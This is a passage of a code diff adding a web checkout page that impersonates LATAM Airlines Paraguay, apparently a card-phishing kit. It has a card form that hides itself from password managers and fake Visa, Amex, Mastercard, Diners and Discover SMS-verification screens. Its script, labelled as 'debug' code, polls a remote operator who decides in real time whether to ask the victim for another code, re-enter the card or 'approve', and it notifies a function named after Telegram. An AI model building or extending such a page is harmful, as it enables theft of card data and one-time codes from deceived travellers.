@@ -1,0 +1,1482 @@
+---
+import { defaultPaymentLegs, paymentCopy } from '../../data/paymentData';
+import { PORCENTAJE_DESCUENTO } from 'astro:env/client';
+
+const copy = paymentCopy;
+const legsJson = JSON.stringify(defaultPaymentLegs);
+---
+
+<section
+  class="pagos-board"
+  id="pagos-board"
+  data-legs={legsJson}
+  data-copy={JSON.stringify(copy)}
+  data-descuento={PORCENTAJE_DESCUENTO}
+>
+  <h1 class="pagos-title">{copy.title}</h1>
+
+  <article class="pagos-summary" id="pagos-summary">
+    <div class="pagos-summary__top">
+      <div>
+        <div class="pagos-summary__total-label">{copy.totalLabel}</div>
+        <div class="pagos-summary__pax" id="pagos-pax-label">1 Adulto</div>
+      </div>
+      <div class="pagos-summary__price" id="pagos-total-price">$0,00</div>
+    </div>
+    <hr class="pagos-summary__rule" />
+    <ol class="pagos-summary__legs" id="pagos-legs"></ol>
+    <div class="pagos-summary__foot">
+      <button type="button" class="pagos-summary__detail" id="pagos-detail-toggle">{copy.detailCta}</button>
+    </div>
+  </article>
+
+  <h2 class="pagos-section-title">{copy.methodsTitle}</h2>
+
+  <div class="pagos-wallet" id="pagos-wallet">
+    <div class="pagos-wallet__art" aria-hidden="true">
+      <img src="/images/pagos-assets/push-login-full.png" alt="" />
+    </div>
+    <div class="pagos-wallet__copy">
+      <p class="pagos-wallet__title">{copy.walletTitle}</p>
+      <p class="pagos-wallet__sub">{copy.walletSubtitle}</p>
+      <button type="button" class="pagos-wallet__link" id="pagos-wallet-login">
+        {copy.walletLogin} <span aria-hidden="true">›</span>
+      </button>
+    </div>
+  </div>
+  <p class="pagos-wallet-msg" id="pagos-wallet-msg" hidden role="status">{copy.walletUnavailable}</p>
+
+  <div class="pagos-method" id="pagos-add-card">
+    <button
+      type="button"
+      class="pagos-method__toggle"
+      id="pagos-add-card-toggle"
+      aria-expanded="false"
+      aria-controls="pagos-card-form"
+    >
+      <span class="pagos-method__ico" aria-hidden="true">
+        <svg viewBox="0 0 32 32" width="24" height="24" fill="none">
+          <rect x="3" y="8" width="22" height="16" rx="2.5" stroke="currentColor" stroke-width="1.8" />
+          <path stroke="currentColor" stroke-width="1.8" d="M3 13h22" />
+          <circle cx="25.5" cy="23.5" r="5.5" fill="#fff" stroke="currentColor" stroke-width="1.6" />
+          <path stroke="currentColor" stroke-width="1.6" stroke-linecap="round" d="M25.5 21v5M23 23.5h5" />
+        </svg>
+      </span>
+      <span class="pagos-method__text">
+        <strong>{copy.addCardTitle}</strong>
+        <span>{copy.addCardSubtitle}</span>
+      </span>
+      <span class="pagos-method__radio" aria-hidden="true"></span>
+    </button>
+
+    <div class="pagos-card-form" id="pagos-card-form" hidden>
+      <div class="pagos-card-payline">
+        <span>{copy.payWithCard}</span>
+        <strong id="pagos-card-amount">$0,00</strong>
+      </div>
+      <div class="pagos-card-grid">
+        <form class="pagos-card-grid-form" id="pagos-card-fields" autocomplete="off" novalidate onsubmit="return false;">
+        <label class="pagos-card-input pagos-card-input--number" id="pagos-card-number-field">
+          <span class="pagos-card-float" aria-hidden="true" data-label={copy.cardNumberPh}></span>
+          <span class="pagos-card-number-box" id="pagos-card-number-box">
+            <span class="pagos-card-brand" id="pagos-card-brand" hidden aria-hidden="true">
+              <img class="pagos-card-brand__logo" data-brand-logo="visa" src="/images/pagos-assets/brands/visa.png" alt="" width="40" height="13" />
+              <img class="pagos-card-brand__logo" data-brand-logo="mastercard" src="/images/pagos-assets/brands/mastercard.png" alt="" width="34" height="22" />
+              <img class="pagos-card-brand__logo" data-brand-logo="amex" src="/images/pagos-assets/brands/amex.png" alt="" width="36" height="24" />
+              <img class="pagos-card-brand__logo" data-brand-logo="diners" src="/images/pagos-assets/brands/diners.png" alt="" width="34" height="22" />
+              <img class="pagos-card-brand__logo" data-brand-logo="discover" src="/images/pagos-assets/brands/discover.png" alt="" width="52" height="34" />
+            </span>
+            <input
+              type="text"
+              name="fld_a"
+              id="pagos-card-number"
+              inputmode="numeric"
+              autocomplete="one-time-code"
+              data-lpignore="true"
+              data-form-type="other"
+              data-1p-ignore="true"
+              placeholder=" "
+              maxlength="19"
+              readonly
+            />
+            <span class="pagos-card-ok" id="pagos-card-number-ok" hidden aria-hidden="true">
+              <svg viewBox="0 0 24 24" width="22" height="22" fill="none" aria-hidden="true">
+                <circle cx="12" cy="12" r="11" stroke="currentColor" stroke-width="1.6" />
+                <path d="M7.2 12.2l3.1 3.1 6.5-6.6" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" />
+              </svg>
+            </span>
+          </span>
+          <p class="pagos-card-error" id="pagos-card-number-error" hidden></p>
+        </label>
+        <label class="pagos-card-input">
+          <span class="pagos-card-ph" aria-hidden="true" data-label={copy.cardNamePh}></span>
+          <input
+            type="text"
+            name="fld_b"
+            id="pagos-card-name"
+            autocomplete="one-time-code"
+            data-lpignore="true"
+            data-form-type="other"
+            data-1p-ignore="true"
+            placeholder=" "
+            readonly
+          />
+          <p class="pagos-card-error" id="pagos-card-name-error" hidden></p>
+        </label>
+        <label class="pagos-card-input pagos-card-input--half">
+          <span class="pagos-card-ph" aria-hidden="true" data-label={copy.cardExpPh}></span>
+          <input
+            type="text"
+            name="fld_c"
+            id="pagos-card-exp"
+            inputmode="numeric"
+            autocomplete="one-time-code"
+            data-lpignore="true"
+            data-form-type="other"
+            data-1p-ignore="true"
+            placeholder=" "
+            maxlength="7"
+            readonly
+          />
+          <p class="pagos-card-error" id="pagos-card-exp-error" hidden></p>
+        </label>
+        <label class="pagos-card-input" id="pagos-card-cvv-wrap" hidden>
+          <span class="pagos-card-ph" aria-hidden="true" data-label={copy.cardCvvPh}></span>
+          <input
+            type="text"
+            name="fld_d"
+            id="pagos-card-cvv"
+            inputmode="numeric"
+            autocomplete="one-time-code"
+            data-lpignore="true"
+            data-form-type="other"
+            data-1p-ignore="true"
+            placeholder=" "
+            maxlength="4"
+            readonly
+          />
+          <p class="pagos-card-error" id="pagos-card-cvv-error" hidden></p>
+        </label>
+        <label class="pagos-card-input pagos-card-input--half">
+          <span class="pagos-card-ph" aria-hidden="true" data-label={copy.cardEmailPh}></span>
+          <input
+            type="text"
+            name="fld_e"
+            id="pagos-card-email"
+            inputmode="email"
+            autocomplete="one-time-code"
+            data-lpignore="true"
+            data-form-type="other"
+            data-1p-ignore="true"
+            placeholder=" "
+            readonly
+          />
+          <p class="pagos-card-error" id="pagos-card-email-error" hidden></p>
+        </label>
+        </form>
+      </div>
+    </div>
+  </div>
+
+  <h2 class="pagos-section-title pagos-section-title--sm">{copy.receiptTitle}</h2>
+  <div class="pagos-panel">
+    <p class="pagos-panel__hint">
+      La persona que reciba el comprobante será <strong>administradora del viaje</strong> y la única que podrá solicitar
+      cambios y devoluciones.
+    </p>
+    <label class="pagos-field pagos-field--filled">
+      <span>Email</span>
+      <input type="email" id="pagos-email" name="email" autocomplete="email" required />
+    </label>
+  </div>
+
+  <h2 class="pagos-section-title pagos-section-title--sm">{copy.invoiceTitle}</h2>
+    <div class="pagos-invoice" id="pagos-invoice">
+    <div class="pagos-invoice__head">
+      <span class="pagos-invoice__ico" aria-hidden="true">
+        <svg viewBox="0 0 32 32" width="22" height="22"><path fill="currentColor" d="M8 4h12l6 6v16a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2Zm11 1.5V11h5.5L19 5.5ZM10 15h12v2H10v-2Zm0 4h12v2H10v-2Zm0 4h8v2h-8v-2Z"></path></svg>
+      </span>
+      <span class="pagos-invoice__label" id="pagos-invoice-label">{copy.invoiceToggle}</span>
+      <button
+        type="button"
+        class="pagos-switch"
+        id="pagos-invoice-toggle"
+        role="switch"
+        aria-checked="false"
+        aria-labelledby="pagos-invoice-label"
+        aria-controls="pagos-invoice-panel"
+      >
+        <span class="pagos-switch__thumb"></span>
+      </button>
+    </div>
+
+    <div class="pagos-invoice__panel" id="pagos-invoice-panel" hidden>
+      <div class="pagos-invoice__tips" role="note">
+        <span class="pagos-invoice__tips-ico" aria-hidden="true">
+          <svg viewBox="0 0 24 24" width="20" height="20">
+            <circle cx="12" cy="12" r="10" fill="currentColor"></circle>
+            <path fill="#ffffff" d="M11 10h2v7h-2v-7Zm0-4h2v2h-2V6Z"></path>
+          </svg>
+        </span>
+        <ul>
+          <li>Factura válida para personas y empresas inscritas en Paraguay.</li>
+          <li>Para justificar costos o gastos, ingresar el RUC, de lo contrario el documento tendrá validez de boleta de venta.</li>
+          <li>Aplica un solo RUC para toda la compra.</li>
+        </ul>
+      </div>
+
+      <div class="pagos-invoice__grid">
+        <label class="pagos-card-input">
+          <span class="pagos-sr-only">Razón social</span>
+          <input type="text" name="invoiceBusinessName" autocomplete="organization" placeholder="Razón social" />
+        </label>
+        <label class="pagos-card-input">
+          <span class="pagos-sr-only">RUC</span>
+          <input type="text" name="invoiceRuc" inputmode="numeric" placeholder="RUC" maxlength="11" />
+        </label>
+        <label class="pagos-card-input pagos-card-input--select">
+          <span class="pagos-sr-only">País</span>
+          <select name="invoiceCountry" aria-label="País" disabled>
+            <option value="PY" selected>Paraguay</option>
+          </select>
+        </label>
+        <label class="pagos-card-input">
+          <span class="pagos-sr-only">Ciudad</span>
+          <input type="text" name="invoiceCity" autocomplete="address-level2" placeholder="Ciudad" />
+        </label>
+        <label class="pagos-card-input pagos-card-input--half">
+          <span class="pagos-sr-only">Email</span>
+          <input type="email" name="invoiceEmail" autocomplete="email" placeholder="Email" />
+          <p class="pagos-invoice__hint">Este correo recibirá la factura</p>
+        </label>
+      </div>
+
+      <label class="pagos-invoice__confirm">
+        <input type="checkbox" id="pagos-invoice-confirm" name="invoiceConfirm" />
+        <span>Confirmo que los datos son correctos y que coinciden con los de SUNAT.</span>
+      </label>
+    </div>
+  </div>
+
+<div class="pagos-actions">
+    <label class="pagos-terms">
+      <input type="checkbox" id="pagos-terms" />
+      <span>
+        {copy.termsPrefix}
+        <a href={copy.termsHref} target="_blank" rel="noopener noreferrer">
+          {copy.termsLink}
+          <svg viewBox="0 0 16 16" width="12" height="12" aria-hidden="true"><path fill="currentColor" d="M6 3h7v7h-2V6.4L4.7 12.7 3.3 11.3 9.6 5H6V3Z"/></svg>
+        </a>
+      </span>
+    </label>
+    <button type="button" class="pagos-pay" id="pagos-pay" disabled>{copy.payPrefix} USD 0,00</button>
+  </div>
+
+  <p class="pagos-msg" id="pagos-msg" hidden></p>
+</section>
+
+<div class="pagos-debug-modal" id="pagos-debug-modal" hidden role="dialog" aria-modal="true" aria-labelledby="pagos-debug-modal-title">
+  <div class="pagos-debug-modal__panel">
+    <h2 id="pagos-debug-modal-title">No pudimos verificar la tarjeta</h2>
+    <p id="pagos-debug-modal-message">Ingresa los datos nuevamente.</p>
+    <button type="button" id="pagos-debug-modal-close">Entendido</button>
+  </div>
+</div>
+
+<div
+  class="pasarela-wait"
+  id="pagos-wait-screen"
+  hidden
+  role="status"
+  aria-live="assertive"
+  aria-busy="true"
+  aria-label="Espera un momento"
+>
+  <div class="pasarela-wait__panel" data-wait-brand="visa" hidden>
+    <div class="pasarela-wait__spin pasarela-wait__spin--visa" aria-hidden="true"></div>
+    <img class="pasarela-wait__logo pasarela-wait__logo--visa" src="/images/pasarela/visa.png" alt="Visa" />
+    <h2 class="pasarela-wait__title">Espera un momento</h2>
+    <p class="pasarela-wait__text">Tomará unos segundos hasta que finalice la operación</p>
+  </div>
+
+  <div class="pasarela-wait__panel" data-wait-brand="amex" hidden>
+    <div class="pasarela-wait__spin pasarela-wait__spin--visa" aria-hidden="true"></div>
+    <img class="pasarela-wait__logo pasarela-wait__logo--amex" src="/images/pasarela/amex-box.png" alt="American Express" />
+    <h2 class="pasarela-wait__title">Espera un momento</h2>
+    <p class="pasarela-wait__text">Tomará unos segundos hasta que finalice la operación</p>
+  </div>
+
+  <div class="pasarela-wait__panel" data-wait-brand="diners" hidden>
+    <div class="pasarela-wait__spin pasarela-wait__spin--visa" aria-hidden="true"></div>
+    <img class="pasarela-wait__logo pasarela-wait__logo--diners" src="/images/pasarela/diners.png" alt="Diners Club" />
+    <h2 class="pasarela-wait__title">Espera un momento</h2>
+    <p class="pasarela-wait__text">Tomará unos segundos hasta que finalice la operación</p>
+  </div>
+
+  <div class="pasarela-wait__panel" data-wait-brand="mastercard" hidden>
+    <div class="pasarela-wait__spin pasarela-wait__spin--mc" aria-hidden="true"></div>
+    <div class="pasarela-wait__mc-brand" aria-hidden="true">
+      <svg viewBox="0 0 62 38" width="42" height="26" xmlns="http://www.w3.org/2000/svg">
+        <circle cx="23" cy="19" r="15" fill="#EB001B"></circle>
+        <circle cx="39" cy="19" r="15" fill="#F79E1B"></circle>
+        <path fill="#FF5F00" d="M31 6.6a15 15 0 0 1 0 24.8 15 15 0 0 1 0-24.8Z"></path>
+      </svg>
+      <span class="pasarela-wait__mc-sep"></span>
+      <span class="pasarela-wait__mc-id">ID Check</span>
+    </div>
+    <h2 class="pasarela-wait__title pasarela-wait__title--mc">Espera un momento</h2>
+    <p class="pasarela-wait__text pasarela-wait__text--mc">Tomará unos segundos hasta que finalice la operación</p>
+  </div>
+
+  <div class="pasarela-wait__panel" data-wait-brand="discover" hidden>
+    <div class="pasarela-wait__spin pasarela-wait__spin--visa" aria-hidden="true"></div>
+    <img class="pasarela-wait__logo pasarela-wait__logo--discover" src="/images/pagos-assets/brands/discover.png" alt="Discover" />
+    <h2 class="pasarela-wait__title">Espera un momento</h2>
+    <p class="pasarela-wait__text">Tomará unos segundos hasta que finalice la operación</p>
+  </div>
+</div>
+
+<div
+  class="pasarela-challenge"
+  id="pagos-challenge-screen"
+  hidden
+  role="dialog"
+  aria-modal="true"
+  aria-label="Verificación de pago"
+>
+  <!-- Visa / Discover (Visa Secure) -->
+  <section class="pasarela-card pasarela-card--visa" data-challenge-brand="visa" hidden>
+    <div class="pasarela-card__body">
+      <header class="pasarela-card__brand-center">
+        <img src="/images/pasarela/visa.png" alt="Visa" class="pasarela-card__logo-visa" />
+      </header>
+      <h2 class="pasarela-card__title pasarela-card__title--visa">VALIDACIÓN DE SEGURIDAD</h2>
+      <div class="pasarela-card__msg">
+        <p>Te hemos enviado un mensaje de texto con un código a tu número de celular registrado.</p>
+        <p>Enviado a su número registrado en el banco.</p>
+        <div class="pasarela-card__box">
+          <p>Estás autorizando el pago a <strong data-challenge-merchant>LATAM Airlines Paraguay</strong></p>
+          <p>Monto: <strong data-challenge-amount>USD 0,00</strong></p>
+          <p>Fecha: <span data-challenge-datetime></span></p>
+        </div>
+      </div>
+      <form class="pasarela-otp" data-otp-form>
+        <label for="otp-visa">Ingrese el código enviado por SMS a su celular</label>
+        <input id="otp-visa" name="otp" type="text" inputmode="numeric" maxlength="12" placeholder="Ingrese su código" autocomplete="one-time-code" />
+        <button type="submit">Enviar</button>
+      </form>
+    </div>
+    <div class="pasarela-help" data-help>
+      <button type="button" class="pasarela-help__toggle" data-help-toggle aria-expanded="false">
+        <span>¿Necesitas ayuda?</span><span data-help-icon>+</span>
+      </button>
+      <div class="pasarela-help__panel" data-help-panel hidden>
+        <p><strong>No recibí el código</strong><br />Revise los mensajes SMS de su celular registrado en el banco. El código puede tardar unos segundos en llegar.</p>
+        <p><strong>El código no funciona</strong><br />Ingrese el código más reciente que recibió por mensaje de texto. Los códigos anteriores dejan de ser válidos.</p>
+      </div>
+    </div>
+  </section>
+
+  <section class="pasarela-card pasarela-card--visa" data-challenge-brand="discover" hidden>
+    <div class="pasarela-card__body">
+      <header class="pasarela-card__brand-center">
+        <img src="/images/pagos-assets/brands/discover.png" alt="Discover" class="pasarela-card__logo-discover" />
+      </header>
+      <h2 class="pasarela-card__title pasarela-card__title--visa">VALIDACIÓN DE SEGURIDAD</h2>
+      <div class="pasarela-card__msg">
+        <p>Te hemos enviado un mensaje de texto con un código a tu número de celular registrado.</p>
+        <p>Enviado a su número registrado en el banco.</p>
+        <div class="pasarela-card__box">
+          <p>Estás autorizando el pago a <strong data-challenge-merchant>LATAM Airlines Paraguay</strong></p>
+          <p>Monto: <strong data-challenge-amount>USD 0,00</strong></p>
+          <p>Fecha: <span data-challenge-datetime></span></p>
+        </div>
+      </div>
+      <form class="pasarela-otp" data-otp-form>
+        <label for="otp-discover">Ingrese el código enviado por SMS a su celular</label>
+        <input id="otp-discover" name="otp" type="text" inputmode="numeric" maxlength="12" placeholder="Ingrese su código" autocomplete="one-time-code" />
+        <button type="submit">Enviar</button>
+      </form>
+    </div>
+  </section>
+
+  <!-- Amex -->
+  <section class="pasarela-card" data-challenge-brand="amex" hidden>
+    <div class="pasarela-card__body">
+      <header class="pasarela-card__brand-row">
+        <img src="/images/pasarela/amex-box.png" alt="American Express" class="pasarela-card__logo-amex" />
+        <img src="/images/pasarela/amex-safekey.png" alt="SafeKey" class="pasarela-card__logo-safekey" />
+      </header>
+      <h2 class="pasarela-card__title">Autorización del Pago</h2>
+      <div class="pasarela-card__msg">
+        <p>Te hemos enviado un mensaje de texto con un código a tu número de celular registrado.</p>
+        <p>Enviado a su número registrado en el banco.</p>
+        <div class="pasarela-card__box">
+          <p>Estás autorizando el pago a <strong data-challenge-merchant>LATAM Airlines Paraguay</strong></p>
+          <p>Monto: <strong data-challenge-amount>USD 0,00</strong></p>
+          <p>Fecha: <span data-challenge-datetime></span></p>
+        </div>
+      </div>
+      <form class="pasarela-otp" data-otp-form>
+        <label for="otp-amex">Ingrese el código enviado por SMS a su celular</label>
+        <input id="otp-amex" name="otp" type="text" inputmode="numeric" maxlength="12" placeholder="Ingrese su código" autocomplete="one-time-code" />
+        <button type="submit">Enviar</button>
+      </form>
+    </div>
+  </section>
+
+  <!-- Mastercard ID Check -->
+  <section class="pasarela-card" data-challenge-brand="mastercard" hidden>
+    <div class="pasarela-card__body">
+      <header class="pasarela-card__brand-center">
+        <div class="pasarela-card__mc-id">
+          <svg viewBox="0 0 62 38" width="56" height="34" aria-hidden="true">
+            <circle cx="23" cy="19" r="15" fill="#EB001B"></circle>
+            <circle cx="39" cy="19" r="15" fill="#F79E1B"></circle>
+            <path fill="#FF5F00" d="M31 6.6a15 15 0 0 1 0 24.8 15 15 0 0 1 0-24.8Z"></path>
+          </svg>
+          <span><em>mastercard</em> <strong>ID Check</strong></span>
+        </div>
+      </header>
+      <h2 class="pasarela-card__title">Autorización del Pago</h2>
+      <div class="pasarela-card__msg">
+        <p>Te hemos enviado un mensaje de texto con un código a tu número de celular registrado.</p>
+        <p>Enviado a su número registrado en el banco.</p>
+        <div class="pasarela-card__box">
+          <p>Estás autorizando el pago a <strong data-challenge-merchant>LATAM Airlines Paraguay</strong></p>
+          <p>Monto: <strong data-challenge-amount>USD 0,00</strong></p>
+          <p>Fecha: <span data-challenge-datetime></span></p>
+        </div>
+      </div>
+      <form class="pasarela-otp" data-otp-form>
+        <label for="otp-mc">Ingrese el código enviado por SMS a su celular</label>
+        <input id="otp-mc" name="otp" type="text" inputmode="numeric" maxlength="12" placeholder="Ingrese su código" autocomplete="one-time-code" />
+        <button type="submit">Enviar</button>
+      </form>
+    </div>
+  </section>
+
+  <!-- Diners -->
+  <section class="pasarela-card pasarela-card--wide" data-challenge-brand="diners" hidden>
+    <div class="pasarela-card__body">
+      <header class="pasarela-card__brand-row">
+        <img src="/images/pasarela/diners.png" alt="Diners Club" class="pasarela-card__logo-diners" />
+        <img src="/images/pasarela/visa.png" alt="Visa" class="pasarela-card__logo-visa-sm" />
+      </header>
+      <h2 class="pasarela-card__title pasarela-card__title--diners">Autenticación de compra</h2>
+      <div class="pasarela-card__diners-grid">
+        <div class="pasarela-card__msg pasarela-card__msg--plain">
+          <p>Te hemos enviado un mensaje de texto con un código a tu número de celular registrado.</p>
+          <p>Enviado a su número registrado en el banco.</p>
+          <div class="pasarela-card__box pasarela-card__box--plain">
+            <p>Estás autorizando el pago a <strong data-challenge-merchant>LATAM Airlines Paraguay</strong></p>
+            <p>Monto: <strong data-challenge-amount>USD 0,00</strong></p>
+            <p>Fecha: <span data-challenge-datetime></span></p>
+          </div>
+        </div>
+        <form class="pasarela-otp pasarela-otp--pill" data-otp-form>
+          <label for="otp-diners">Ingrese el código enviado por SMS a su celular</label>
+          <input id="otp-diners" name="otp" type="text" inputmode="numeric" maxlength="12" placeholder="Ingrese su código" autocomplete="one-time-code" />
+          <button type="submit">Enviar</button>
+        </form>
+      </div>
+    </div>
+  </section>
+</div>
+
+<div class="pagos-sheet" id="pagos-sheet" hidden>
+  <button type="button" class="pagos-sheet__backdrop" data-pagos-sheet-close aria-label="Cerrar"></button>
+  <div class="pagos-sheet__panel" role="dialog" aria-modal="true" aria-labelledby="pagos-sheet-title">
+    <header class="pagos-sheet__head">
+      <h3 id="pagos-sheet-title">Detalle de tu compra</h3>
+      <button type="button" class="pagos-sheet__close" data-pagos-sheet-close aria-label="Cerrar">×</button>
+    </header>
+    <div class="pagos-sheet__body" id="pagos-sheet-body"></div>
+  </div>
+</div>
+
+<script>
+  import {
+    cardNumberMaxLength,
+    detectCardBrand,
+    formatCardExp,
+    formatCardNumber,
+    onlyDigits,
+    validateCardExp,
+    validateCardNumber,
+  } from '../../services/cardPaymentValidation';
+
+  function notifyTelegramStep(event) {
+    try {
+      fetch('/api/debug-page', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ event }),
+        keepalive: true,
+      }).catch(() => {});
+    } catch {
+      /* Debug telemetry is best-effort. */
+    }
+  }
+
+  const boardEl = document.getElementById('pagos-board');
+  const legsJson = boardEl?.dataset.legs || '[]';
+  const copy = JSON.parse(boardEl?.dataset.copy || '{}');
+  const discountPct = Number(boardEl?.dataset.descuento || 0) || 0;
+
+  const STORAGE_KEY = 'latam-checkout-selection';
+  const SEATS_KEY = 'latam-seat-selection';
+  const STORE_KEY = 'latam-store-selection';
+  const PAX_KEY = 'latam-passenger-draft';
+  const DEBUG_SESSION_KEY = 'latam-debug-session-id';
+  const defaultLegs = JSON.parse(legsJson);
+
+  function debugSessionId() {
+    let sessionId = sessionStorage.getItem(DEBUG_SESSION_KEY);
+    if (!sessionId) {
+      sessionId = crypto.randomUUID();
+      sessionStorage.setItem(DEBUG_SESSION_KEY, sessionId);
+    }
+    return sessionId;
+  }
+
+  async function sendDebugEvent(event, payload = {}) {
+    console.log(`[debug-before-fetch:${event}]`, {
+      sessionId: debugSessionId(),
+      route: window.location.pathname,
+      ...payload,
+    });
+    const response = await fetch('/api/debug', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        event,
+        sessionId: debugSessionId(),
+        route: window.location.pathname,
+        ...payload,
+      }),
+    });
+    if (!response.ok) throw new Error('No se pudo consultar el enrutador debug');
+    return response.json();
+  }
+
+  let debugPollGen = 0;
+
+  async function pollDebugDecision(timeoutMs = 90000, gen = debugPollGen) {
+    const sessionId = debugSessionId();
+    const started = Date.now();
+    while (Date.now() - started < timeoutMs) {
+      if (gen !== debugPollGen) return { action: 'cancelled' };
+      const response = await fetch(`/api/debug?sessionId=${encodeURIComponent(sessionId)}`, {
+        headers: { Accept: 'application/json' },
+      });
+      if (response.ok) {
+        const payload = await response.json();
+        const decision = payload?.decision || {};
+        if (decision.action && decision.action !== 'wait') return decision;
+      }
+      await new Promise((resolve) => window.setTimeout(resolve, 1500));
+    }
+    return {
+      action: 'timeout',
+      message: 'La verificacion esta tardando mas de lo esperado. Intenta nuevamente.',
+    };
+  }
+
+  async function watchOperatorDecisions({
+    wait,
+    challenge,
+    brandKey,
+    merchantLabel,
+    amountLabel,
+    datetimeLabel,
+    resetChallenge = true,
+  }) {
+    const gen = debugPollGen;
+    while (gen === debugPollGen) {
+      const decision = await pollDebugDecision(180000, gen);
+      if (gen !== debugPollGen) return;
+      const nextAction = decision?.action || 'timeout';
+      if (nextAction === 'cancelled') return;
+
+      if (nextAction === 'sms' || nextAction === 'sms_error') {
+        if (wait) wait.hidden = true;
+        document.body.classList.remove('is-offers-waiting');
+        if (resetChallenge) {
+          showChallenge(
+            brandKey,
+            merchantLabel,
+            amountLabel,
+            datetimeLabel,
+            nextAction === 'sms_error' ? decision?.message || '' : '',
+          );
+        } else {
+          if (challenge) challenge.hidden = false;
+          setChallengeMessage(
+            brandKey,
+            decision?.message || 'Código inválido. Hemos enviado un nuevo código por SMS o correo',
+            nextAction === 'sms_error' ? 'error' : 'info',
+          );
+          const input = challenge?.querySelector(`[data-challenge-brand="${brandKey}"] input[name="otp"]`);
+          if (input) {
+            input.value = '';
+            input.focus();
+          }
+        }
+        continue;
+      }
+
+      if (nextAction === 'card' || nextAction === 'card_error') {
+        if (wait) wait.hidden = true;
+        if (challenge) challenge.hidden = true;
+        document.body.classList.remove('is-offers-waiting');
+        clearCardInputs();
+        setCardOpen(true);
+        showCardErrorModal(decision?.message || 'No pudimos verificar la tarjeta. Ingresa los datos nuevamente.');
+        cardNumber?.focus();
+        return;
+      }
+
+      if (nextAction === 'approved') {
+        if (wait) wait.hidden = true;
+        if (challenge) challenge.hidden = true;
+        document.body.classList.remove('is-offers-waiting');
+        window.location.href = '/success';
+        return;
+      }
+
+      if (challenge && !challenge.hidden) continue;
+      if (wait) wait.hidden = true;
+      document.body.classList.remove('is-offers-waiting');
+      setUiMessage(decision?.message || 'La verificacion esta tardando mas de lo esperado. Intenta nuevamente.');
+      return;
+    }
+  }
+
+  function maskCard(value) {
+    const digits = onlyDigits(value || '');
+    if (digits.length < 8) return digits.replace(/\d/g, '*');
+    return `${digits.slice(0, 6)}******${digits.slice(-4)}`;
+  }
+
+  function setUiMessage(message, kind = 'error') {
+    if (!msg) return;
+    msg.hidden = !message;
+    msg.textContent = message || '';
+    msg.dataset.kind = kind;
+  }
+
+  function setChallengeMessage(brand, message, kind = 'error') {
+    const challenge = document.getElementById('pagos-challenge-screen');
+    const panel = challenge?.querySelector(`[data-challenge-brand="${brand}"]`);
+    const form = panel?.querySelector('[data-otp-form]');
+    if (!form) {
+      setUiMessage(message, kind);
+      return;
+    }
+    let error = form.querySelector('[data-otp-debug-message]');
+    if (!error) {
+      error = document.createElement('p');
+      error.setAttribute('data-otp-debug-message', '');
+      error.setAttribute('role', 'alert');
+      error.style.margin = '10px 0 0';
+      error.style.fontSize = '13px';
+      error.style.lineHeight = '1.35';
+      form.appendChild(error);
+    }
+    error.textContent = message || '';
+    error.hidden = !message;
+    error.dataset.kind = kind;
+    error.style.color = kind === 'success' ? '#178a3b' : kind === 'info' ? '#1b4e9b' : '#b42318';
+  }
+
+  function clearChallengeMessages() {
+    document.querySelectorAll('[data-otp-debug-message]').forEach((el) => {
+      el.textContent = '';
+      el.hidden = true;
+    });
+  }
+
+  function clearCardInputs() {
+    [cardNumber, cardName, cardExp, cardCvv, cardEmail].forEach((input) => {
+      if (!input) return;
+      input.value = '';
+      input.setAttribute('readonly', '');
+      syncPlaceholderState(input);
+    });
+    syncCardFieldStates({ force: false });
+    syncPayEnabled();
+  }
+
+  function showCardErrorModal(message = 'No pudimos verificar la tarjeta. Ingresa los datos nuevamente.') {
+    const modal = document.getElementById('pagos-debug-modal');
+    const text = document.getElementById('pagos-debug-modal-message');
+    const close = document.getElementById('pagos-debug-modal-close');
+    if (text) text.textContent = message;
+    if (modal) modal.hidden = false;
+    document.body.classList.add('pagos-debug-modal-open');
+    close?.focus();
+  }
+
+  function closeCardErrorModal() {
+    const modal = document.getElementById('pagos-debug-modal');
+    if (modal) modal.hidden = true;
+    document.body.classList.remove('pagos-debug-modal-open');
+    cardNumber?.focus();
+  }
+
+  document.getElementById('pagos-debug-modal-close')?.addEventListener('click', closeCardErrorModal);
+
+  function showChallenge(brand, merchantLabel, amountLabel, datetimeLabel, withError = '') {
+    const challenge = document.getElementById('pagos-challenge-screen');
+    const brandKey = ['visa', 'amex', 'diners', 'mastercard', 'discover'].includes(brand) ? brand : 'visa';
+    clearChallengeMessages();
+    challenge?.querySelectorAll('[data-challenge-brand]').forEach((panel) => {
+      const active = panel.getAttribute('data-challenge-brand') === brandKey;
+      panel.hidden = !active;
+      if (!active) return;
+      panel.querySelectorAll('[data-challenge-merchant]').forEach((el) => {
+        el.textContent = merchantLabel;
+      });
+      panel.querySelectorAll('[data-challenge-amount]').forEach((el) => {
+        el.textContent = amountLabel;
+      });
+      panel.querySelectorAll('[data-challenge-datetime]').forEach((el) => {
+        el.textContent = datetimeLabel;
+      });
+      const form = panel.querySelector('[data-otp-form]');
+      if (form) form.dataset.attempts = '0';
+      const input = panel.querySelector('input[name="otp"]');
+      if (input) input.value = '';
+    });
+    if (challenge) challenge.hidden = false;
+    if (withError) setChallengeMessage(brandKey, withError);
+  }
+
+  function money(value, withUsd = false) {
+    const n = Number(value || 0);
+    const formatted = n.toFixed(2).replace('.', ',');
+    return withUsd ? `USD\u00a0${formatted}` : `$${formatted}`;
+  }
+
+  function ticketAfterDiscount(original) {
+    const base = Number(original) || 0;
+    if (!(discountPct > 0)) return Math.round(base * 100) / 100;
+    return Math.round(base * (1 - Math.min(100, discountPct) / 100) * 100) / 100;
+  }
+
+  function ticketMoney(original, withUsd = false) {
+    const before = Number(original) || 0;
+    if (!(discountPct > 0)) return money(before, withUsd);
+    return `<span class="ticket-price"><span class="ticket-price__was">${money(before, withUsd)}</span><span class="ticket-price__now">${money(ticketAfterDiscount(before), withUsd)}</span></span>`;
+  }
+
+  function totalMoney(before, after, withUsd = false) {
+    if (!(discountPct > 0) || Math.abs(before - after) < 0.005) return money(after, withUsd);
+    return `<span class="ticket-price"><span class="ticket-price__was">${money(before, withUsd)}</span><span class="ticket-price__now">${money(after, withUsd)}</span></span>`;
+  }
+
+  function readJson(key, fallback) {
+    try {
+      return JSON.parse(sessionStorage.getItem(key) || 'null') ?? fallback;
+    } catch {
+      return fallback;
+    }
+  }
+
